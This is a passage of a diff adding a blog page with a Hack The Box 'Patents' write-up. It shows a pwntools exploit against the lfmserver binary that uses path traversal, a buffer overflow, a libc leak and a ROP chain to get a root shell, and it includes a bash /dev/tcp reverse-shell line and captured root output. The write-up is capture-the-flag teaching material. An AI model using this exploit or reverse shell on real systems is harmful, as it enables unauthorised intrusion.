+       <span class="cp">#include &lt;unistd.h&gt;
+</span>
+       <span class="kt">int</span> <span class="n">dup</span><span class="p">(</span><span class="kt">int</span> <span class="n">oldfd</span><span class="p">);</span>
+       <span class="kt">int</span> <span class="nf">dup2</span><span class="p">(</span><span class="kt">int</span> <span class="n">oldfd</span><span class="p">,</span> <span class="kt">int</span> <span class="n">newfd</span><span class="p">);</span>
+<span class="p">[...]</span>
+</code></pre></div></div>
+<p>In order to do so, we have to call dup2 with socket (not known yet) as the old fd and 0 (stdin), 1 (stdout), 2 (stderr) as the newfd.</p>
+
+<h3 id="exploitation">Exploitation</h3>
+<p>The exploit will be developed using python3 with pwntools (4.1.0). This whole section will be an explaination of the key-elements of the exploit code. The complete code can be found on my <a href="https://github.com/chr0x6eos/HTB/blob/master/Patents/root.py">Github</a>.</p>
+
+<h4 id="overflowing-the-buffer">Overflowing the buffer</h4>
+<p>My initial plan of using /dev/null as the file the read did not work. After a hint from the forum, I tried using <code class="language-plaintext highlighter-rouge">/proc/sys/kernel/randomize_va_space</code>. As most systems usually have ASLR enabled, the MD5-sum should match with the one from my machine.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">overflow</span><span class="p">(</span><span class="n">FILE</span><span class="o">=</span><span class="s">"/proc/sys/kernel/randomize_va_space"</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">"../../../../../.."</span><span class="c1"># "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e"
+</span>    <span class="n">payload</span> <span class="o">=</span> <span class="n">urlencode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">FILE</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">x"</span> <span class="c1"># Inject invalid character that will write null bytes
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">urlencode</span><span class="p">(</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">106</span><span class="p">)</span> <span class="c1">#Overflow # "%41" * 106
+</span>    <span class="k">return</span> <span class="n">payload</span><span class="p">,</span> <span class="n">genMD5</span><span class="p">(</span><span class="n">FILE</span><span class="p">)</span>
+</code></pre></div></div>
+<p>The overflow function generates and returns a payload to overflow the buffer, as well as the md5sum of the file used.</p>
+
+<h4 id="generating-the-requests">Generating the requests</h4>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">genReq</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+    <span class="n">junk</span><span class="p">,</span> <span class="n">md5</span> <span class="o">=</span> <span class="n">overflow</span><span class="p">(</span><span class="n">FILE</span><span class="p">)</span>
+    <span class="n">request</span> <span class="o">=</span> <span class="s">"CHECK /{JUNK}{PAYLOAD} LFM</span><span class="se">\r\n</span><span class="s">User=lfmserver_user</span><span class="se">\r\n</span><span class="s">"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">JUNK</span><span class="o">=</span><span class="n">junk</span><span class="p">,</span><span class="n">PAYLOAD</span><span class="o">=</span><span class="n">urlencode</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="bp">True</span><span class="p">))</span>
+    <span class="n">request</span> <span class="o">+=</span> <span class="s">"Password=!gby0l0r0ck$$!</span><span class="se">\r\n\r\n</span><span class="s">{md5}</span><span class="se">\n</span><span class="s">"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">md5</span><span class="o">=</span><span class="n">md5</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">request</span>
+</code></pre></div></div>
+<p>The genReq function calls the overflow function and generates a valid request with the inputted payload to exploit the binary.</p>
+
+<p>The payload is URL-encoded using the previously mentioned function from GitHub.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">urlencode</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="nb">bytes</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
+    <span class="k">if</span> <span class="nb">bytes</span><span class="p">:</span> <span class="c1"># Don't use ord if already bytes
+</span>        <span class="k">return</span> <span class="s">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s">"</span><span class="si">%</span><span class="s">{0:0&gt;2}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">format</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="s">"x"</span><span class="p">))</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s">"</span><span class="si">%</span><span class="s">{0:0&gt;2}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">format</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">),</span> <span class="s">"x"</span><span class="p">))</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h4 id="leaking-libc-base-1">Leaking libc-base</h4>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">fd</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Trying fd: </span><span class="si">%</span><span class="s">d"</span> <span class="o">%</span> <span class="n">fd</span><span class="p">)</span>
+        <span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">([</span><span class="n">binary</span><span class="p">])</span>
+
+        <span class="c1"># call write(fd, dup2@got, 8);
+</span>        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span>
+        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span>
+        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">binary</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'dup2'</span><span class="p">])</span> <span class="c1"># function to leak, can be any function
+</span>        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="c1"># for r15
+</span>        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">nop</span><span class="p">)</span>
+        <span class="c1"># rdx is 8
+</span>        <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">binary</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'write'</span><span class="p">])</span>
+
+        <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">genReq</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">rop</span><span class="p">)))</span>
+
+        <span class="c1"># Recv junk
+</span>        <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Size: 32"</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
+
+        <span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()[</span><span class="mi">1</span><span class="p">:</span><span class="mi">7</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+        <span class="n">clear</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+
+        <span class="c1"># Check if leak is plausible
+</span>        <span class="k">if</span> <span class="n">leak</span> <span class="o">&lt;</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'dup2'</span><span class="p">]:</span>
+            <span class="k">raise</span> <span class="nb">Exception</span><span class="p">(</span><span class="s">"Leak not plausible!"</span><span class="p">)</span>
+
+        <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'dup2'</span><span class="p">]</span>
+        <span class="n">clear</span><span class="p">()</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Leaked libc-base: </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+        <span class="k">return</span> <span class="bp">True</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">False</span>
+</code></pre></div></div>
+<p>Now with the genRequest setup, the rest of the exploitation is just simple rop. The gadgets can be acquired using any tool. I used ropper to get the gadgets:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># ropper --file lfmserver
+</span><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x0405c4b</span> <span class="c1">#0x0405c4b: pop rdi; ret;
+</span><span class="n">pop_rsi</span> <span class="o">=</span> <span class="mh">0x0405c49</span> <span class="c1">#0x0405c49: pop rsi; pop r15; ret;
+</span><span class="n">nop</span>     <span class="o">=</span> <span class="mh">0x040251f</span> <span class="c1">#0x040251f: nop; ret;
+</span></code></pre></div></div>
+<p>We use write to leak dup2@got and calculate the libc base address. I simply manually brute forced the fd (using a for loop), until I got a valid result.</p>
+
+<h4 id="ropchain-for-popping-a-shell">Ropchain for popping a shell</h4>
+<p>With the libc base address leaked, we use a simple ropchain to redirect stdin, stdout and stderr to the socket and then call system(/bin/sh).</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">genRopchain</span><span class="p">(</span><span class="n">fd</span><span class="p">):</span>
+    <span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">([</span><span class="n">binary</span><span class="p">,</span><span class="n">libc</span><span class="p">])</span>
+
+    <span class="n">rop</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="n">rop</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="n">rop</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+
+    <span class="n">rop</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">)))</span>
+    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
+</code></pre></div></div>
+<p>Pwntools luckily can do all the heavy lifting and gives us an easy way to redirect stdin, stdout and stderr to the socket fd and calls system with /bin/sh.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">sendPayload</span><span class="p">(</span><span class="n">fd</span><span class="p">):</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+    <span class="n">rop</span> <span class="o">=</span> <span class="n">genRopchain</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">genReq</span><span class="p">(</span><span class="n">rop</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">io</span>
+</code></pre></div></div>
+<p>Now we just need to call the genRopchain function and send the ropchain to the server.</p>
+
+<h4 id="final-exploit">Final exploit</h4>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">fd</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">10</span><span class="p">):</span>
+            <span class="k">if</span> <span class="n">leak</span><span class="p">(</span><span class="n">fd</span><span class="p">):</span>
+                <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Found fd: </span><span class="si">%</span><span class="s">d"</span> <span class="o">%</span> <span class="n">fd</span><span class="p">)</span>
+                <span class="n">shell</span> <span class="o">=</span> <span class="n">sendPayload</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span>
+                <span class="n">clear</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+                <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">REV</span><span class="p">:</span>
+                    <span class="n">ip</span> <span class="o">=</span> <span class="n">get_ip_address</span><span class="p">(</span><span class="s">"tun0"</span><span class="p">)</span>
+                    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Setup your listener! [nc -lvnp 443]"</span><span class="p">)</span>
+                    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+                        <span class="n">done</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Send payload? [Y/n] "</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
+                        <span class="k">if</span> <span class="n">done</span> <span class="ow">in</span> <span class="p">[</span><span class="s">"Y"</span><span class="p">,</span><span class="s">"y"</span><span class="p">,</span><span class="s">""</span><span class="p">]:</span>
+                            <span class="n">clear</span><span class="p">()</span>
+                            <span class="n">shell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"bash -c 'bash -i &gt;&amp; /dev/tcp/{IP}/443 0&gt;&amp;1'"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">IP</span><span class="o">=</span><span class="n">ip</span><span class="p">))</span>
+                            <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Reverse-shell payload send!"</span><span class="p">)</span>
+                            <span class="n">shell</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+                            <span class="n">clear</span><span class="p">()</span>
+                            <span class="k">break</span>
+                        <span class="n">clear</span><span class="p">()</span>
+                    <span class="k">return</span> <span class="bp">True</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="n">shell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"id"</span><span class="p">)</span>
+                    <span class="n">shell</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+                    <span class="k">return</span> <span class="bp">True</span>
+    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="n">ex</span><span class="p">)</span>
+        <span class="k">return</span> <span class="bp">False</span>
+</code></pre></div></div>
+<p>All fds from 3 to 10 are brute forced. If the fd is found, the final payload is send using sendPayload, which either gets us a shell or a reverse-shell, depending on user-input.</p>
+
+<h3 id="getting-shell-as-root">Getting shell as root</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">silence</span><span class="p">:</span><span class="o">~</span><span class="c1"># python3 exploit3.py
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s">'/root/lfmserver'</span>
+    <span class="n">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
+    <span class="n">RELRO</span><span class="p">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
+    <span class="n">Stack</span><span class="p">:</span>    <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>
+    <span class="n">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
+    <span class="n">PIE</span><span class="p">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Leaked</span> <span class="n">libc</span><span class="o">-</span><span class="n">base</span><span class="p">:</span> <span class="mh">0x7f6f4454f000</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Found</span> <span class="n">fd</span><span class="p">:</span> <span class="mi">6</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
+<span class="n">LFM</span> <span class="mi">200</span> <span class="n">OK</span>
+<span class="n">Size</span><span class="p">:</span> <span class="mi">32</span>
+
+<span class="mi">26</span><span class="n">ab0db90d72e28ad0ba1e22ee510510</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
+<span class="err">$</span> <span class="n">hostname</span>
+<span class="n">patents</span>
+<span class="err">$</span> <span class="n">whoami</span>
+<span class="n">root</span>
+</code></pre></div></div>
+<p>The shell proved to be quite instable, so I added a functionality to quickly get a reverse-shell.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">silence</span><span class="p">:</span><span class="o">~</span><span class="c1"># python3 exploit3.py REV
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s">'/root/lfmserver'</span>
+    <span class="n">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
+    <span class="n">RELRO</span><span class="p">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
+    <span class="n">Stack</span><span class="p">:</span>    <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>
+    <span class="n">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
+    <span class="n">PIE</span><span class="p">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Leaked</span> <span class="n">libc</span><span class="o">-</span><span class="n">base</span><span class="p">:</span> <span class="mh">0x7f6f4454f000</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Found</span> <span class="n">fd</span><span class="p">:</span> <span class="mi">6</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Setup</span> <span class="n">your</span> <span class="n">listener</span><span class="err">!</span> <span class="p">[</span><span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">443</span><span class="p">]</span>
+<span class="n">Send</span> <span class="n">payload</span><span class="err">?</span> <span class="p">[</span><span class="n">Y</span><span class="o">/</span><span class="n">n</span><span class="p">]</span>
+
+<span class="n">root</span><span class="o">@</span><span class="n">silence</span><span class="p">:</span><span class="o">~</span><span class="c1"># nc -lvnp 443
+</span><span class="n">listening</span> <span class="n">on</span> <span class="p">[</span><span class="nb">any</span><span class="p">]</span> <span class="mi">443</span> <span class="o">...</span>
+
+<span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="mf">10.10.14.23</span><span class="p">]</span> <span class="k">from</span> <span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">10.10.10.173</span><span class="p">]</span> <span class="mi">59558</span>
+<span class="n">bash</span><span class="p">:</span> <span class="n">cannot</span> <span class="nb">set</span> <span class="n">terminal</span> <span class="n">process</span> <span class="n">group</span> <span class="p">(</span><span class="mi">1248</span><span class="p">):</span> <span class="n">Inappropriate</span> <span class="n">ioctl</span> <span class="k">for</span> <span class="n">device</span>
+<span class="n">bash</span><span class="p">:</span> <span class="n">no</span> <span class="n">job</span> <span class="n">control</span> <span class="ow">in</span> <span class="n">this</span> <span class="n">shell</span>
+<span class="n">root</span><span class="o">@</span><span class="n">patents</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">checker_server</span><span class="c1">#
+</span></code></pre></div></div>
+<p>Now that we have a shell, let us read root.txt.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@patents:~# <span class="nb">ls</span> <span class="nt">-alh</span>
+<span class="nb">ls</span> <span class="nt">-alh</span>
+total 23K
+drwxr-xr-x  7 root root 1.0K Dec  3 14:25 <span class="nb">.</span>
+drwxr-xr-x 23 root root 4.0K Jan 12 00:03 ..
+lrwxrwxrwx  1 root root    9 May 22  2019 .bash_history -&gt; /dev/null
+drwx------  2 root root 1.0K May 21  2019 .cache
+drwx------  3 root root 1.0K May 21  2019 .gnupg
+drwxr-xr-x  3 root root 1.0K Dec  3 14:25 .local
+drwx------  2 root root  12K May 21  2019 lost+found
+drwxr-xr-x  3 root root 1.0K May 21  2019 snap
+<span class="nt">-rw-------</span>  1 root root 1.6K May 22  2019 .viminfo
+</code></pre></div></div>
+<p>Seems like the root.txt is not here! Let us enumerate the machine to find the root.txt.</p>
+
+<h2 id="enumerating-the-server-to-find-roottxt">Enumerating the server to find root.txt</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@patents:~# lsblk
+NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
+loop0    7:0    0 54.9M  1 loop /snap/lxd/12631
+loop1    7:1    0 66.7M  1 loop /snap/lxd/9239
+loop2    7:2    0 89.1M  1 loop /snap/core/8268
+loop3    7:3    0 54.2M  1 loop /snap/lxd/10756
+loop4    7:4    0 89.1M  1 loop /snap/core/8039
+sda      8:0    0   25G  0 disk
+├─sda1   8:1    0    1M  0 part
+├─sda2   8:2    0   16G  0 part / &lt;<span class="nt">--</span> not mounted!
+├─sda3   8:3    0    1G  0 part /boot
+└─sda4   8:4    0    2G  0 part /home
+sdb      8:16   0  512M  0 disk
+└─sdb1   8:17   0  511M  0 part /root
+sr0     11:0    1 1024M  0 rom
+</code></pre></div></div>
+<p>Listing all disks, we can see that sda2 is not mounted, but still has a size of 16G.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@patents:~# <span class="nb">df
+df
+</span>Filesystem     1K-blocks    Used Available Use% Mounted on
+udev              976616       0    976616   0% /dev
+tmpfs             201728   10484    191244   6% /run
+/dev/sda2       15465340 4306660  10303436  30% /
+tmpfs            1008624       0   1008624   0% /dev/shm
+<span class="o">[</span>...]
+</code></pre></div></div>
+<p>Using df we can check again if /dev/sda2 is mounted anywhere. Let us mount sda2 and see if we find root.txt there.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@patents:~# mount /dev/sda2 /mnt/
+root@patents:~# <span class="nb">cd</span> /mnt/root/<span class="p">;</span> <span class="nb">ls
+</span>root.txt
+secret
+snap
+</code></pre></div></div>
+<p>Now that we have mounted sda2, we can finally read root.txt.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@patents:/mnt/root# <span class="nb">cat </span>root.txt
+d63b0<span class="k">***************************</span>
+root@patents:/# umount /mnt/
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/2020/05/16/htb-Patents.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Chr0x6eOs</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Chr0x6eOs</li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/chr0x6eos"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">chr0x6eos</span></a></li><li><a href="https://www.twitter.com/Chr0x6eOs"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">Chr0x6eOs</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>Blog for HTB writeups and other security related stuff</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
